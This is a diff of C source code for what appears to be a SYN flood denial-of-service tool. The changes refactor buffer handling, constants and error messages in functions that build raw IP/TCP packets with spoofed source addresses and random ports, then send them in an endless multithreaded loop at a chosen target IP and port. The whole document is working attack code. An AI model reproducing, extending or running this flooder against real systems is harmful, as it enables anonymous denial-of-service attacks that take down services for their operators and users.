@@ -80,8 +80,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     }
     int i;
     // datagram to represent the packet
-    char datagram[40960];
-    char source_ip[32];
+    char datagram[4096];
     //IP header
     struct iphdr *iph = (struct iphdr *)datagram;
     //TCP header
@@ -89,17 +88,11 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     struct sockaddr_in sin;
     struct pseudo_header psh;
 
-    if (!strncpy(source_ip, ss->src_ip, SYN_FLOOD_IP_BUFFER_SIZE))
-    {
-        DisplayError("Attack strncpy failed");
-        return 1;
-    }
     //strcpy(source_ip, "192.168.1.1");
-
     sin.sin_family = AF_INET;
     sin.sin_port = htons((int)ss->dst_port);
     //sin.sin_port = htons(80);
-    // Target
+    // target
     sin.sin_addr.s_addr = inet_addr(ss->dst_ip);
     //sin.sin_addr.s_addr = inet_addr("1.2.3.4");
 
@@ -111,20 +104,20 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
         return 1;
     }
 
-    // Fill in the IP Header
+    // fill in the IP header
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
-    // Id of this packet
+    // id of this packet
     iph->id = htons(54321);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_TCP;
-    // Set to 0 before calculating checksum
+    // set to 0 before calculating checksum
     iph->check = 0;
-    // Spoof the source ip address
-    iph->saddr = inet_addr(source_ip);
+    // spoof the source ip address
+    iph->saddr = inet_addr(ss->src_ip);
     iph->daddr = sin.sin_addr.s_addr;
 
     iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);
@@ -147,14 +140,14 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     tcph->urg = 0;
     // maximum allowed window size
     tcph->window = htons(5840);
-    // If you set a checksum to zero, your kernel's IP stack
-    // Should fill in the correct checksum during transmission
+    // if you set a checksum to zero, your kernel's IP stack
+    // should fill in the correct checksum during transmission
     tcph->check = 0;
 
     tcph->urg_ptr = 0;
     // Now the IP checksum
 
-    psh.source_address = inet_addr(source_ip);
+    psh.source_address = inet_addr(ss->src_ip);
     psh.dest_address = sin.sin_addr.s_addr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_TCP;
@@ -217,6 +210,19 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     return 0;
 }
 
+static void FreeSYNStructBuff(pSYNStruct input)
+{
+    // free the structure
+    if (input)
+    {
+        if (input->dst_ip)
+        {
+            free(input->dst_ip);
+        }
+        free(input);
+    }
+}
+
 static int AttackThread(pInput input)
 {
     // now we start the syn flood attack
@@ -251,13 +257,13 @@ static int AttackThread(pInput input)
         split_result->port = SYN_FLOOD_PORT_DEFAULT;
     }
     // init the target ip and port
-    syn_struct->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
+    syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(syn_struct->dst_ip))
     {
         DisplayError("SYNFloodAttack_Thread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
-    if (!memset(syn_struct->dst_ip, 0, SYN_FLOOD_IP_BUFFER_SIZE))
+    if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
     {
         DisplayError("SYNFloodAttack_Thread memset failed: %s(%d)", strerror(errno), errno);
         return 1;
@@ -288,12 +294,12 @@ static int AttackThread(pInput input)
         // here we will use the default ip address and port
         else
         {
-            if (!strncpy(syn_struct->src_ip, SIP_ADDRESS, strlen(SIP_ADDRESS)))
+            if (!strncpy(syn_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
             {
                 DisplayError("SYNFloodAttack_Thread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                 return 1;
             }
-            syn_struct->src_port = (int)SIP_PORT;
+            syn_struct->src_port = (int)DEFAULT_PORT;
         }
 
         // rport is random source port
@@ -307,15 +313,8 @@ static int AttackThread(pInput input)
         }
         FreeRandomIPBuff(syn_struct->src_ip);
     }
-    free(syn_struct);
+    FreeSYNStructBuff(syn_struct);
     return 0;
-}
-
-static void SignalExit(int signo)
-{
-    // for show message
-    DisplayInfo("Quit the program now");
-    exit(0);
 }
 
 int StartSYNFloodAttack(const pInput input)
@@ -331,6 +330,7 @@ int StartSYNFloodAttack(const pInput input)
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
 
+    extern void SignalExit(int signo);
     signal(SIGINT, SignalExit);
     // unlimit loop
     for (;;)
@@ -343,13 +343,13 @@ int StartSYNFloodAttack(const pInput input)
                 //input->serial_num = (i * input->max_thread) + j;
                 if (pthread_attr_init(&attr))
                 {
-                    DisplayError("StartGuess pthread_attr_init failed");
+                    DisplayError("StartSYNFlood pthread_attr_init failed");
                     return 1;
                 }
                 //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                 if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                 {
-                    DisplayError("StartGuess pthread_attr_setdetachstate failed");
+                    DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                     return 1;
                 }
                 // create thread
@@ -387,13 +387,13 @@ int StartSYNFloodAttack(const pInput input)
                         //input->serial_num = (i * input->max_thread) + j;
                         if (pthread_attr_init(&attr))
                         {
-                            DisplayError("StartGuess pthread_attr_init failed");
+                            DisplayError("StartSYNFlood pthread_attr_init failed");
                             return 1;
                         }
                         //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                         if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                         {
-                            DisplayError("StartGuess pthread_attr_setdetachstate failed");
+                            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                             return 1;
                         }
                         // create thread
